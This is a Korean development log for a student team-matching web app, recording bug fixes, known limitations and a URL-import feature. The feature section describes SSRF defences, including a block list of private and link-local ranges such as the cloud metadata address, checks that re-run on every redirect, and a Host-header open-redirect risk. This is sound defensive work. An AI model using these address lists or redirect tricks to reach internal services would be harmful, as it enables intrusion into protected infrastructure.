| 360px/1440px 스크린샷 확인 (`/parties`, `/parties/new`, `/parties/[id]`, `/parties/[id]/edit` — 3단계 보완) | 가로 스크롤 없음, 역할별 인원 입력 행·역할 현황("개발 0/2 · 기획 1/1 · 디자인 0/1")·부족한 역할 안내·정보 수정 폼이 두 뷰포트 모두에서 레이아웃 깨짐 없이 표시됨 |
| 360px/1440px 스크린샷 확인 (`/chat`, `/chat/[roomId]`, `/notifications`, `/me` — 4-A) | 가로 스크롤 없음, 채팅 버블·링크 렌더링·멤버 요약·안 읽은 배지·알림 목록이 두 뷰포트 모두에서 레이아웃 깨짐 없이 표시됨 |
| 360px/1440px 스크린샷 확인 (`/match/[activityId]` 참가·대기·제안 화면, 관리자 템플릿 관리 — 4-B) | 가로 스크롤 없음, 템플릿 선택·역할 체크박스·팀 구성 목록·역할 입력 행이 두 뷰포트 모두에서 레이아웃 깨짐 없이 표시됨 |

## 2-B 작업 중 발견하고 고친 버그 (실제 영향이 있던 것들)

1. **매직링크 로그인이 실제로는 깨져 있었음 (가장 중요).** `/auth/confirm`에서 리다이렉트 URL을 `new URL(request.url).origin`으로 만들었는데, Next 개발 서버가 실제 접속 호스트(`127.0.0.1:3000`)와 무관하게 `request.url`을 `localhost:3000` 기준으로 보고하는 경우가 있었다. 그 결과 세션 쿠키는 `127.0.0.1`에 설정되고 리다이렉트는 `localhost`로 가서, 쿠키가 전달되지 않아 로그인 직후 다시 로그아웃 상태로 보였다. 실제 브라우저에서도 재현되는 버그였다 — curl로 쿠키 흐름을 직접 추적해서 찾았다. **수정(현재 코드 기준):** 요청의 `Host` 헤더는 클라이언트가 보내는 값이라 조작 가능해(Host 헤더 포이즈닝 → 오픈 리다이렉트) 신뢰하지 않는다. 대신 `NEXT_PUBLIC_SITE_URL`(+ 선택적 `..._ALIASES`)로 만든 허용 목록(`src/lib/url.ts`의 `resolveAllowedOrigins`/`pickRequestOrigin`)에서만 리다이렉트 origin을 고르고, `next` 파라미터도 같은 사이트 내 상대경로일 때만 허용한다(`src/app/auth/confirm/route.ts`). 이 문서는 한동안 "Host 헤더를 그대로 쓰는 1차 수정"으로만 기록돼 있었는데, 실제로는 더 나아가 허용 목록 방식으로 교체된 상태였다 — 문서를 코드에 맞게 갱신한다.
2. **`party_members` 자기 참조 RLS 정책이 무한 재귀 오류(42P17)를 냄.** 2-A에서 발견해 "본인/파티장만" 허용으로 축소해뒀던 것을, 이번에 `is_party_member()` SECURITY DEFINER 헬퍼로 제대로 해결(위 항목 참조).
3. **(해결됨, 2026-10-03 재확인) `next dev`가 127.0.0.1 등 비-localhost 호스트의 `_next/*` 자산 요청을 403으로 막아 클라이언트 번들이 부트스트랩되지 않고 하이드레이션이 전혀 일어나지 않았다** — 로그인 폼 버튼을 눌러도 아무 반응이 없고(이벤트 핸들러가 안 붙어 있어 네이티브 GET 폼 제출만 발생), 이로 인해 Playwright E2E가 전부 실패했었다. 처음엔 HMR 웹소켓 핸드셰이크 실패로 오진했었다. **수정:** `next.config.ts`에 `allowedDevOrigins: ["127.0.0.1", "localhost"]` 추가. **검증:** `npm run dev`로 띄운 서버에서 `_next/static` 청크가 127.0.0.1 Origin으로 200 응답하는 것을 확인했고, `tests/e2e/auth-onboarding.spec.ts`를 그 dev 서버에 대해 직접 실행해 통과(로그인 폼 상호작용이 정상 동작)시켰다. README를 dev 서버 기준 사용법으로 되돌렸다. Playwright E2E는 배포 산출물 검증을 위해 계속 `build && start`를 대상으로 한다(dev 제약 회피 목적 아님).
4. **`.claude/` 상태줄 훅이 `npx @claude-flow/cli hooks statusline --json` 프로세스를 정리하지 않고 계속 쌓음.** 디버깅 중 node 프로세스 46개가 좀비로 남아있는 것을 발견(이 프로젝트와 무관한 Ruflo 툴링 문제). 정리했고, Claude Code에 피드백으로 남겨뒀다(제품 이슈이며 이 저장소 코드와는 무관).
5. (2-A에서 이미 기록) 시드 스크립트의 활동 선택 쿼리 동점 문제, 마이그레이션 함수 정의 순서 — 둘 다 2-A 때 수정 완료.

## 4-A단계에서 발견하고 고친 버그

1. **"private 채널 + postgres_changes" Realtime 설계가 애초에 동작하지 않았음.** 처음 설계는 `chat_messages`를 `supabase_realtime` 발행에 추가하고 클라이언트가 `{ config: { private: true } }` + `postgres_changes`로 구독하는 것이었다. 로컬 스택에서 독립된 두 브라우저 컨텍스트로 실제 송수신을 검증하다가 메시지가 전혀 전달되지 않는 것을 발견했다. 원인: Supabase 공식 문서에 "private 채널 옵션은 Postgres Changes에는 적용되지 않는다"고 명시돼 있고, private 채널은 `realtime.messages` 테이블의 RLS로 "채널 구독 자체"를 인가하는데 이 테이블에 정책이 하나도 없으면(로컬 스택 기본값) 누구도 조인하지 못한다 — 구독이 거부돼 이벤트가 전달되지 않았다. **수정:** Broadcast-from-Database로 교체(`chat_messages` AFTER INSERT 트리거가 `realtime.broadcast_changes()`로 브로드캐스트 + `realtime.messages`에 `is_party_member()` 기반 RLS 정책 추가, 마이그레이션 `20261003161000`). **검증:** 독립 Node 스크립트로 구독→전송→수신을 직접 확인한 뒤 `tests/e2e/chat-flow.spec.ts`로 재검증. `docs/architecture.md` 11.2절에 상세 기록.
2. **채팅방을 읽고 바로 다른 화면으로 이동하면 "안 읽음" 배지가 늦게 지워짐.** 클라이언트 하트비트(`mark_chat_read` 비동기 호출)만 믿었더니, Playwright E2E에서 방을 읽자마자 `/chat` 목록으로 이동하는 시나리오에서 그 비동기 호출이 완료(커밋)되기 전에 페이지를 떠나 안 읽은 수가 그대로 남는 경우가 재현됐다. **수정:** 채팅방 서버 컴포넌트(`/chat/[roomId]/page.tsx`)가 메시지를 조회한 직후 `mark_chat_read`를 서버에서 바로 `await`해, 화면이 렌더링되기 전에 읽음 처리가 끝나도록 했다(클라이언트 하트비트는 "보고 있는 동안" 신호 용도로 계속 둔다).

## 4-B단계에서 발견하고 고친 버그

1. **매칭 후보를 모으는 질의가 "FOR UPDATE is not allowed with window functions" 오류를 냄.** `_find_match_for_group`에서 `row_number() over (...)`(윈도우 함수)로 후보에 번호를 매기면서 같은 질의에 `FOR UPDATE SKIP LOCKED`를 같이 썼더니 PostgreSQL이 거부했다. 로컬 스택에서 워커를 실제로 실행해 보다가 바로 드러났다. **수정:** 잠그는 부분을 CTE로 분리하고(`with locked as (... for update skip locked)`), 바깥 SELECT에서만 `row_number()`를 매기도록 나눴다.
2. **제안 화면에 내 팀원이 나밖에 안 보임.** `match_proposal_members`의 SELECT RLS가 "본인 행만"(`profile_id = auth.uid()`) 허용하도록 돼 있어서, 2명짜리 제안에서도 상대방의 역할·이름이 전혀 보이지 않았다 — `party_members`가 2-B 때 겪었던 것과 같은 유형의 버그다. 실제로 화면을 띄워 스크린샷을 찍어보다가 발견했다(자동 테스트만으로는 못 잡을 뻔했다 — RLS 테스트가 본인 응답 흐름만 확인했음). **수정:** `is_party_member()`와 같은 패턴으로 `is_match_proposal_member()` SECURITY DEFINER 헬퍼를 추가해 "같은 제안의 멤버끼리 서로 조회 가능"하게 정책을 바꿨다(마이그레이션 `20261003170300`).
3. **빠른 매칭으로 확정된 팀의 채팅방에 "팀이 확정됐다"는 안내가 아예 없음.** 수동 파티는 `confirm_party`가 시스템 메시지를 남기는데, `_finalize_match_proposal`(매칭 확정 경로)에는 그 호출이 빠져 있었다 — E2E로 실제 채팅방을 열어보다가 메시지 목록이 비어 있는 것을 보고 발견했다. **수정:** 파티·채팅방 생성 직후 `insert_system_chat_message()` 한 줄을 추가했다(마이그레이션 `20261003170400`).
4. **Realtime "이미 열린 연결" 차단이 완전하지 않을 수 있음 (버그는 아니지만 한계 재확인).** 4-A에서 하트비트로 방어선을 뒀는데, Realtime private 채널의 구독 인가가 메시지마다가 아니라 연결 단위로 캐시된다는 공식 문서를 다시 확인했다 — 클라이언트 JS가 막히면 다음 JWT 갱신 전까지 이미 열린 연결이 메시지를 계속 받을 수 있다. `jwt_expiry`를 1시간→5분으로 줄여 노출 구간을 좁혔다. 상세·남는 한계는 `docs/operations.md` 참조.

## 알려진 제한 / 다음 단계로 미룬 것

1. **추천 계산의 "활동기간·투입시간 적합성(duration_time_fit)" 항목은 항상 "미상"으로 처리된다.** `activities` 테이블에 "주당 필요 시간" 같은 비교 가능한 필드가 없어서다(설계상 가중치 15는 배정돼 있으나 비교 불가 데이터로 처리하는 것이 허위 정밀도보다 낫다고 판단). 실제 필드를 추가하려면 활동 등록 폼·CSV 가져오기 스키마도 함께 바꿔야 한다.
2. ~~파티 역할 슬롯 배정 UI 없음~~ → **3단계 보완에서 해결.** 위 "3단계 보완" 절 참조.
3. ~~파티 정보 수정 기능 없음~~ → **3단계 보완에서 해결** (`update_party_details()` + `/parties/[id]/edit`). 단, 역할 추가/삭제·이름 변경은 여전히 범위 밖이다(기존 역할의 인원 조정만 가능) — 위 "3단계 보완" 절의 "의도적으로 범위에서 뺀 것" 참조.
4. ~~3단계 신규 화면 스크린샷 미재확인~~ → **3단계 보완에서 해결** (`/parties`, `/parties/new`, `/parties/[id]`, `/parties/[id]/edit`를 360px/1440px로 확인). 채팅 UI는 4-A, 빠른 매칭 UI는 4-B에서 해결.
5. ~~매칭 확정 워커 없음~~ → **4-B에서 해결.** `run_match_worker` + pg_cron. 위 "4-B단계 진행 상황" 참조.
6. ~~파티 공동 멤버 간 상호 조회는 2-B에서 해결했지만, "채팅 참가자 목록" 같은 파생 조회 UI는 아직 없다~~ → **4-A에서 해결.** `/chat/[roomId]`가 멤버 목록(닉네임·팀장 여부·역할)을 보여준다.
7. **CSV 가져오기는 `activity_type` 이름 정확히 일치만 연결**하고 fuzzy 매칭은 하지 않는다. 운영자가 이름을 맞추거나 가져온 뒤 수정 화면에서 보정해야 한다.
8. **프로필 "다른 사용자에게 공개" 범위가 좁다.** `profile_majors`/`profile_interests`/`profile_skills`/`availability_slots`는 RLS상 본인·운영자만 조회 가능 — 추천 계산(서버에서 본인 데이터만 읽으므로 문제없음)에는 지장이 없지만, "팀원 프로필 보기" 같은 화면이 생기면 RLS 정책을 넓히거나 전용 뷰/함수가 필요하다.
9. **npm 취약점 1건(개발 의존성, high)** — `eslint-config-next`가 의존하는 `fast-glob`→`micromatch`→`braces`(GHSA-vfj7-8cjw-p6xm). `npm audit fix --force`는 Next 16과 불호환되는 `eslint-config-next@14.2.35`로 내려가므로 적용하지 않음. 런타임/배포 번들에는 포함되지 않는 린트 전용 devDependency.
10. **상명대 이메일 도메인/전공 전체 목록/에브리타임 공식 연동 미확인** — 1단계 기록 그대로. `app_settings.allowed_email_domains`와 `majors` 테이블이 운영자 편집 가능하므로 값만 갱신하면 된다.
11. **"채팅방을 보고 있으면 알림을 만들지 않는다"는 정확한 presence 추적이 아니라 근사치다(4-A).** 15초 하트비트 + 30초 신선도 판정을 쓰므로, 최악의 경우 방을 보고 있는 중에도 최대 약 15~30초의 오차로 알림이 한 번 생성될 수 있다(반대로 막 나간 직후에는 생성되지 않을 수도 있음). 완벽한 해결은 Presence(`channel.track()`) 기반 실시간 재실 여부 추적이 필요하며, 이번 범위에서는 과도한 복잡도로 보류했다.
12. **채팅 메시지에 파일/이미지 전송, 메시지 삭제·수정, 읽음 확인(누가 읽었는지) 기능은 없다** — 지시서 범위 밖(후속 확장 항목)이며 이번 4-A에서도 추가하지 않았다.
13. **(5단계에서 검토할 것) 탈퇴 후 이미 열린 Realtime 연결의 서버 측 차단이 완전하지 않을 수 있다.** Realtime private 채널의 구독 인가는 메시지마다가 아니라 "연결 단위"로 캐시되고 새 JWT가 전달될 때만(로그인/토큰 갱신) 재검사된다(공식 문서로 재확인). 탈퇴·강퇴된 사용자의 클라이언트 하트비트(4-A)가 정상 동작하면 즉시 끊기지만, 그 JS가 막히거나 변조되면 다음 토큰 갱신 전까지 이미 열린 연결이 메시지를 계속 "수신"만은 할 수 있다(전송·읽음 처리는 매 호출마다 서버가 재검증하므로 이미 완전히 막혀 있음). **적용한 완화책:** `jwt_expiry`를 3600초→300초로 줄여 노출 구간을 최대 1시간에서 최대 5분으로 좁혔다. **남는 한계와 5단계에서 검토할 대안**(더 짧은 만료, Realtime Admin으로 특정 연결 강제 종료, 팀 이탈 시 `access_token` 재전송 강제 트리거 등)은 `docs/operations.md`에 기록했다.
14. **서버 액션에 `zod` 입력 검증이 없다.** `package.json`에 의존성으로는 있지만 실제로 쓰인 곳이 없다(보안 리뷰로 확인). DB 함수가 전부 재검증하는 패턴이라 실제 악용 경로는 찾지 못했지만, 방어의 겹이 하나 적은 상태다. 새 서버 액션을 추가할 때부터라도 zod 스키마를 먼저 쓰는 습관을 권장한다.
15. **온보딩·프로필 수정 후 추천 근거가 실제로 바뀌는지 확인하는 전용 E2E가 없다** (지시서 13장 인수 조건 1번, "⚠️ 부분"). `recommend.test.ts`(단위, 입력이 바뀌면 재계산됨)와 코드 구조(캐시 없이 매번 현재 프로필을 읽음)로 미루어 안전하다고 판단했지만, 실제 화면으로 눈으로 확인한 적은 없다. 재현 명령은 위 "5-B단계: 인수 조건 점검" 표의 1번 행 참조.
16. **마감된 활동이 추천 목록에서 실제로 빠지는지 확인하는 전용 테스트가 없다** (인수 조건 3번, "⚠️ 부분"). 쿼리 레벨 필터(`status='published'`)로 구조적으로는 보장되지만 회귀 테스트가 없다.

## 6단계: 링크 붙여넣기 활동 등록 (진행 중)

사용자 요청으로 새로 시작한 작업. 목표: 운영자·사용자가 주최기관 공식 공고 URL만 붙여넣으면
빠르고 정확하게 활동을 등록할 수 있게 한다. **날짜와 링크는 AI가 만들어내지 않는다** — 규칙
기반 추출을 우선하고, LLM은 선택적 보조(제목·주최·태그 후보만)로 제한한다. 작업 단위(가져오기·
SSRF / 추출·검증 / 화면 / 정기 점검)마다 커밋한다.

### 1/4: 가져오기·SSRF (완료)

- **SSRF 방어 (`src/lib/activity-import/ssrf.ts`):** http/https만 허용, IPv4 사설 대역
  (10/8, 172.16/12, 192.168/16), 링크 로컬(169.254/16 — 클라우드 메타데이터 169.254.169.254
  포함), 루프백, CGNAT(100.64/10), 멀티캐스트/예약 대역, IPv6(루프백 ::1, 링크 로컬 fe80::/10,
  유니크 로컬 fc00::/7, 멀티캐스트 ff00::/8, 문서용 2001:db8::/32)를 차단한다. IPv4-매핑/NAT64
  IPv6 주소(`::ffff:a.b.c.d`)는 **내부 IPv4를 다시 꺼내 같은 기준으로 재검사**한다(접두사 자체는
  차단하지 않음 — 공인 IPv4를 매핑한 경우까지 차단하면 과차단이다). `localhost`류 호스트명은
  DNS 조회 전에 1차로 차단한다.
  - **구현 중 발견한 버그 2건(단위 테스트로 드러남):** IPv6 차단 대역 상수를 16진수 리터럴로
    손으로 세어 적었다가 자릿수가 하나 부족해 `fe80::1`/`fc00::1`/`ff02::1`이 차단되지 않는
    버그가 있었다 — `expandIpv6()` 파서 자체로 표준 표기("fe80::" 등)를 계산해 상수를 만드는
    방식으로 고쳐 손 계산을 없앴다. 또한 "IPv4-매핑 접두사 자체를 무조건 차단" 로직이
    `::ffff:8.8.8.8`(공인 IP를 매핑한 것)까지 차단하는 과차단 버그가 있어, 매핑 접두사는
    "내부 IPv4를 추출해 재검사"로만 쓰도록 분리했다.
- **단일 페이지 가져오기 (`src/lib/activity-import/fetch.ts`):** 목록 페이지를 따라가며 여러
  공고를 긁는 기능은 만들지 않았다 — 호출자가 준 URL 정확히 하나만 가져온다. 리다이렉트는
  **매 홉마다 호스트를 처음부터 다시 SSRF 검사**한 뒤에만 따라간다(공개 호스트가 내부 IP로
  리다이렉트하는 공격 방지), 최대 5회. 응답 크기(기본 2MB)·시간(기본 8초) 제한, `Content-Type`이
  `text/html`이 아니면 거부, 식별 가능한 User-Agent(`SangmyungMateLinkImporter/1.0`) 사용.
  DNS 조회와 HTTP 요청 둘 다 주입 가능한 의존성(`FetchDeps`)으로 분리해, 단위 테스트가 실제
  네트워크 없이 "사설 IP로 가는 리다이렉트 차단" 같은 시나리오를 검증한다.
- **robots.txt (`src/lib/activity-import/robots.ts`):** 가져오기 전에 `{origin}/robots.txt`를
  같은 안전한 방식으로 조회해 경로가 허용되는지 확인한다(robots.txt가 없거나 조회 자체가
  실패하면 허용으로 간주 — 보수적으로 "막지 않는" 쪽으로 기본값을 둔다). User-Agent 그룹 매칭,
  `*` 와일드카드, `$` 끝 고정, 더 구체적인 Allow가 Disallow를 이기는 규칙을 지원한다.
  - **구현 중 발견한 버그:** `*`를 정규식으로 바꾸는 과정에서 전체 문자열을 먼저 정규식
    특수문자로 escape한 뒤 escape된 `\*`를 찾아 `.*`로 바꾸려 했으나, `*` 자체가 애초에
    escape 대상 문자 목록에 없어 `\*`가 생성되지 않아 치환이 전혀 동작하지 않는 버그가 있었다
    (`*`가 그대로 정규식 수량자로 해석되어 와일드카드가 깨짐). `*` 기준으로 문자열을 나눠
    각 조각만 escape하고 `.*`로 join하는 방식으로 고쳤다.
- **URL 정규화 (`src/lib/activity-import/url-normalize.ts`):** 입력한 URL을 표준
  정규화(퍼센트 인코딩 통일·호스트 소문자화 등)만 적용해 그대로 저장용으로 돌려준다(추측으로
  경로·쿼리를 바꾸지 않음). 중복 후보 탐지용 "느슨한 키"(www. 제거, 끝 슬래시 제거, 호스트+경로
  소문자)는 별도 함수로 분리했다.
- **가져오기 빈도 제한 (마이그레이션 `20261004080000`):** `check_url_fetch_rate_limit()`
  (SECURITY DEFINER, `authenticated`만 호출 가능)이 시간당 허용 횟수(`app_settings.
  url_import_rate_limits`, 기본 20회)를 넘기면 `RATE_LIMITED`로 거부하고, 통과 시 `url_fetch_log`
  에 기록한다. **서버 액션은 실제 외부 가져오기를 시작하기 전에 이 함수를 먼저 호출**해, 제한을
  넘으면 외부 요청 자체를 하지 않는다(Postgres는 임의 외부 HTTP 요청을 할 수 없으므로 실제
  가져오기는 Node 서버 액션에서 수행 — 이 함수는 빈도 제한만 담당). 정지/탈퇴 계정도 기존
  `_require_active_profile()`을 재사용해 호출을 막는다. `url_fetch_log`는 RLS를 켜둔 채
  정책을 하나도 두지 않아(SECURITY DEFINER 함수만 접근) 일반 사용자가 직접 읽거나 쓸 수 없다.
- **검증:** 단위 테스트 73건(`tests/unit/activity-import/{ssrf,robots,url-normalize,fetch}.test.ts`)
  — IPv4/IPv6 차단 대역 경계값, robots.txt 와일드카드/우선순위, 리다이렉트 재검사(사설 IP로
  가는 리다이렉트 차단 포함), 크기·시간·Content-Type 제한, 로봇 차단/허용/없음. RLS 테스트
  3건(`tests/rls/url_import_rate_limit.test.ts`) — 비로그인 거부, 제한 이내 통과 후 초과 시
  거부, 정지된 계정 거부. `tests/rls/execute_privileges.test.ts` 허용 목록에 새 함수 추가.
  `npm test` **208/208 통과**, `lint`·`typecheck`·`build` 모두 성공.

### 2/4: 추출·검증 (완료)

- **HTML → 평문 (`src/lib/activity-import/html-text.ts`):** DOM 파서 의존성을 새로 추가하지
  않고 정규식으로 `<script>`/`<style>`/주석을 제거하고, 블록 태그 경계는 개행으로 보존해(문장
  경계 유지) 날짜 추출·근거 문장 표시에 쓸 평문을 만든다. HTML 엔티티(`&amp;`, `&#44;` 등)를
  디코딩한다.
- **구조화 데이터 추출 (`extract.ts`):** JSON-LD(`<script type="application/ld+json">`, 배열/
  `@graph` 평탄화, 깨진 JSON은 그 블록만 무시), `og:title`/`og:description`/`description` meta,
  `<title>`, `<link rel="canonical">`를 규칙 기반으로 뽑는다.
- **한국어 날짜 후보 추출 (`extract.ts`):** `2026.10.31.`, `2026. 10. 31.`, `2026-10-31 18:00`,
  `2026년 10월 31일(금)`, `10월 31일(금)`(연도 없음), `~10/31`(연도 없음) 형식을 규칙 기반
  정규식으로 찾는다. 더 구체적인(연도 포함) 패턴이 먼저 선점한 구간은 덜 구체적인 패턴이 다시
  매칭하지 않도록 겹침을 검사한다. 각 후보는 **원문 근거 문장**(같은 줄 안에서 전후 30자,
  문단 경계를 넘지 않음)과 함께 반환되고, "접수시작/마감" 류 키워드·`~` 접두사로 `apply_start/
  apply_end/unknown` 역할을 추정한다(어디까지나 미리보기에서 운영자가 보는 힌트일 뿐, 최종
  확정은 운영자가 한다). **연도가 본문에 없으면** "이미 90일 넘게 지난 날짜면 내년으로 본다"는
  결정적 규칙으로 추정하고 `yearInferred: true`로 표시해 "AI가 지어낸 값"과 구분한다.
  - **구현 중 발견한 버그:** 근거 문장(context) 윈도우를 줄 경계 없이 ±30자로만 잘랐다가,
    바로 다음 문단의 "모집 마감" 같은 키워드가 앞 문단의 "모집 시작" 날짜의 context에 섞여
    들어가 역할이 반대로 분류되는 버그가 있었다(단위 테스트로 발견). context를 같은 줄(문단)
    경계 안으로만 clamp하도록 고쳤다.
- **검증 규칙 (`verify.ts`):** `verifyDateAgainstText(raw, sourceText)` — 공백 차이만 무시하고
  원문에 그 문자열이 그대로 있는지 대조한다(LLM이 제안했든 추출기가 찾았든 동일 기준). 날짜는
  이 검증을 통과하지 못하면 "원문 확인 필요"로 표시한다. `checkDateRangeIssues()` — 시작>마감,
  마감이 지나치게 과거/미래(`app_settings`로 조정 가능한 기본값: 과거 14일, 미래 548일), 마감이
  KST 자정(시각 없음)인지를 표시만 하고 저장을 막지는 않는다(`format.ts`의 기존 날짜 정밀도
  규칙 — "자정=날짜만 입력"을 그대로 재사용하도록 `isKstMidnight`을 공유 헬퍼로 뽑았다). 모집
  상태는 여전히 저장된 `apply_end_at`으로 DB(`getApplyPhase`)가 계산하며 이 검증과 무관하다.
- **중복 후보 (`duplicates.ts`):** 정규화된 URL(dedupe 키)·제목(공백/구두점 무시)·주최기관으로
  기존 활동과 겹치는지 찾는다. 주최기관만 같은 것은 신호가 약해(흔한 기관명) 제목까지 함께
  맞을 때만 근거로 센다.
- **LLM 보조(선택, 기본 꺼짐) (`llm.ts`):** `ACTIVITY_IMPORT_LLM_API_KEY` 환경변수가 없으면
  `getLlmProvider()`가 `null`을 반환해 전체 흐름이 규칙 기반 추출 + 수동 입력만으로 계속
  동작한다. 키가 있으면 기본 공급자(Anthropic Messages API)가 제목·주최기관·태그·유형·자격
  요약 **후보만** 제안하고, **날짜는 시스템 프롬프트로 명시적으로 금지**하며 응답에 날짜 필드가
  와도(`applyEndAt` 등) 스키마에 없으므로 버린다. 네트워크 오류·타임아웃·JSON 파싱 실패·빈
  응답 등 어떤 이유로든 예외를 던지지 않고 `null`을 반환한다(호출자는 "LLM 없이 계속"과
  동일하게 처리). 공급자는 인터페이스(`LlmExtractionProvider`)로 추상화돼 있어 교체 가능.
- **검증:** 단위 테스트 102건(`tests/unit/activity-import/{html-text,extract,verify,duplicates,
  llm}.test.ts`), HTML 픽스처 2개(`tests/unit/fixtures/activity-import/notice-*.html`)로 실제
  공고 페이지 모양을 흉내냈다. `npm test` **248/248 통과**, `lint`·`typecheck` 모두 성공.

### 3/4: 화면 (완료)

- **스키마 확장 (마이그레이션 `20261004090000`):** `activities`에 `source_url_resolved`(가져오기
  시점 최종 리다이렉트 URL), `apply_end_at_evidence`(접수 마감일을 뽑은 원문 문자열 — 정기
  점검 워커가 재확인에 쓴다), `needs_verification`/`verification_note`(정기 점검 워커(4/4)만
  관리하는 운영 플래그, 등록 시 항상 기본값으로 시작)를 추가했다. `submit_activity()`에 날짜 4개
  + 가져오기 메타데이터 2개를 **끝에 기본값 `null`로 추가**해 기존 호출자와 호환되게 했다.
  - **구현 중 발견한 버그(실제로 중요함):** PostgreSQL에서 함수의 "신원"은 이름+파라미터
    타입 전체라서, `create or replace function submit_activity(...)`를 파라미터 **개수가
    다른** 시그니처로 다시 정의하면 기존 함수를 대체하는 게 아니라 **오버로드로 새로 추가**된다
    — 옛 8-인자 버전이 `anon`/`authenticated` 권한을 그대로 쥔 채 조용히 남아있었다.
    `tests/rls/execute_privileges.test.ts`(5-B 보안 마무리에서 만든 전수 가드)가 이걸 즉시
    잡아냈다. `drop function if exists ...(옛 시그니처)`를 먼저 실행하도록 고쳤다 — 앞으로
    함수 파라미터 개수를 바꿀 때마다 반드시 거쳐야 하는 패턴으로 `docs/architecture.md` 13장에
    추가했다.
- **공유 오케스트레이션 (`src/lib/activity-import/preview.ts`):** `buildPreviewFromHtml()`(순수
  함수 — 이미 가져온 HTML/기존 활동 목록을 받아 미리보기 데이터 조립, 단위 테스트 대상)과
  `runUrlImportPreview()`(실제 I/O: 빈도 제한 RPC → SSRF 안전 가져오기 → 기존 활동 조회 →
  선택적 LLM 호출 → 조립)로 나눴다. 규칙 우선순위는 JSON-LD > `og:` > `meta`/`title`이고, LLM
  제안은 규칙 기반 값이 전부 비어 있을 때만 보충한다.
- **서버 액션:** `src/app/admin/activities/import-url-actions.ts`(관리자 — `isCurrentUserAdmin()`
  재확인, 페이지 레이아웃의 인가 검사는 서버 액션 직접 호출을 막지 않으므로 액션 자체에서도
  검사), `src/app/activities/submit/import-url-actions.ts`(로그인 사용자 — 실제 빈도 제한은
  DB의 `check_url_fetch_rate_limit()`가 담당).
- **화면 (`src/components/UrlImportPanel.tsx`, 관리자·사용자 제보 화면 공유):** URL 입력 →
  "URL로 가져오기" → 추출된 제목/주최기관/설명/(AI 제안 시)태그·유형·자격요약을 "적용" 버튼으로
  개별 반영, 날짜 후보마다 **원문 근거 문장**과 "원문에서 확인됨" 배지(+연도 추정 시 별도
  경고), 대상 필드(접수시작/마감/활동시작/종료)를 골라 "이 값으로 적용", 기간 이슈 경고,
  URL·제목·주최기관 기준 중복 후보 목록을 보여준다. 어떤 것도 자동으로 저장되지 않고 운영자/
  사용자가 "적용"을 눌러야 폼에 반영된다. **"검증됨 ↔ 원문 확인 필요" 표시는 접수 마감 필드에
  한해 실제로 추적한다** — 날짜 후보를 "적용"하면 그 원문 문자열이 `applyEndAtEvidence`로
  폼 상태에 저장되고 입력창 아래 "원문에서 확인됨: “...”"로 보여지며, 그 상태에서 **운영자가
  접수 마감을 직접 다시 고치면** 근거가 즉시 비워지고 "직접 입력됨 — 원문 확인 필요"로
  바뀐다(`handleApplyEndAtInputChange`). 이 근거 문자열이 `apply_end_at_evidence` 컬럼에
  저장되어 정기 점검 워커(4/4)가 재확인에 쓴다.
  - `ActivityForm.tsx`(관리자, 모든 필드 지원 + 중복 후보에 수정 화면 링크)와
    `SubmitActivityForm.tsx`(사용자 제보 — 기존에 날짜 입력 자체가 없었어서 접수 시작/마감
    필드를 이번에 새로 추가했다)에 공통 패널을 꽂았다.
- **E2E 테스트 네트워크 문제와 해결(투명하게 기록):** SSRF 방어(1/4)가 `localhost`/사설 IP를
  막는 것은 의도한 동작이지만, 그래서 브라우저로 "URL 붙여넣기 → 가져오기"를 실제로 검증하려면
  로컬 고정 포트의 픽스처 서버(127.0.0.1)를 가져와야 하는데 바로 그 주소가 차단 대상이다.
  **해결:** `ACTIVITY_IMPORT_SSRF_TEST_ALLOWLIST` 환경변수(쉼표 구분 호스트명)가 설정된
  경우에만 그 호스트의 차단을 건너뛰는 예외를 `fetch.ts`에 추가했다 — 기본값은 "미설정"이며
  미설정이면 기존 차단 로직과 100% 동일하게 동작한다(단위 테스트로 "허용 목록이 있어도 목록에
  없는 사설 IP는 그대로 차단됨"까지 확인). 이 환경변수는 `playwright.config.ts`의 `webServer.env`
  에만 설정해 **운영 배포 경로에는 전혀 영향이 없다**(`SUPABASE_DB_URL`이 테스트 하네스 전용인
  것과 같은 패턴). `tests/e2e/fixture-server.ts`(Node 내장 `http` 모듈만 사용, 새 의존성 없음)가
  127.0.0.1의 임의 빈 포트에 고정 HTML을 서빙한다.
- **검증:** 단위 테스트 7건 추가(`preview.test.ts` 5건 + `fetch.test.ts` SSRF 허용목록 2건,
  총 **265건**), RLS 테스트 5건(`tests/rls/url_import_submit.test.ts` — 날짜·메타데이터 저장,
  기본 호출 호환성, 기간 역전 거부, XSS 방어 유지, 오버로드 잔존 회귀), E2E 1건
  (`tests/e2e/activity-url-import-flow.spec.ts` — 관리자 로그인 → URL 가져오기 → 제목/날짜
  적용 → 요약 직접 수정 → 공개로 등록 → `/admin/activities`·`/activities` 양쪽에 표시 확인).
  `npm test` **260/260 통과**, Playwright 전체 **9/9 통과**(기존 8개 전부 회귀 없음),
  `lint`·`typecheck`·`build` 모두 성공.

### 4/4: 정기 점검 (완료)

- **설계 선택과 이유:** 매칭 워커(`run_match_worker`)는 pg_cron이 DB 안에서 직접 실행하지만,
  링크 점검은 **외부 호스트로 나가는 실제 HTTP 요청**이 필요해 Postgres 혼자서는(pg_net 같은
  확장 없이는) 할 수 없다. 그래서 DB는 "점검할 활동을 안전하게 나눠주고 결과를 기록하는" 두
  함수만 담당하고, 실제 가져오기는 Next.js Route Handler(`src/app/api/cron/link-check/route.ts`)
  가 수행하도록 역할을 나눴다 — "서버 스케줄로 하루 1회"라는 요구사항은 지키지만 pg_cron이 아닌
  **외부 스케줄러가 호출하는 HTTP 엔드포인트**로 구현했다는 점이 매칭 워커와 다르다(이
  저장소에서 실제 외부 스케줄러 등록까지는 하지 않았다 — README/architecture.md에 등록 방법과
  이유를 기록).
- **DB (마이그레이션 `20261004100000`):** `activities.last_verification_attempt_at` 컬럼 추가.
  `claim_activities_for_link_check(limit, as_of, stale_after_hours=20)` — `FOR UPDATE SKIP
  LOCKED`로 후보를 잠그고 **같은 트랜잭션 안에서 즉시 시도 시각을 찍어 반환**해(matching
  워커와 동일한 원칙) 워커가 겹쳐 실행돼도 같은 활동을 중복 점검하지 않고, 최근(기본 20시간
  이내) 이미 시도한 활동은 후보에서 빠져 "하루 1회"가 자연스럽게 지켜진다.
  `record_link_check_result(activity_id, ok, resolved_url?, note?)` — 정상이면
  `last_verified_at` 갱신 + `needs_verification` 해제, 비정상이면 `needs_verification=true` +
  `verification_note` 기록 + 운영자 알림(활동 단위 `dedupe_key`로 묶어 같은 문제가 매일
  이어져도 알림이 쌓이지 않고 1건만 유지·갱신됨). 둘 다 `service_role` 전용.
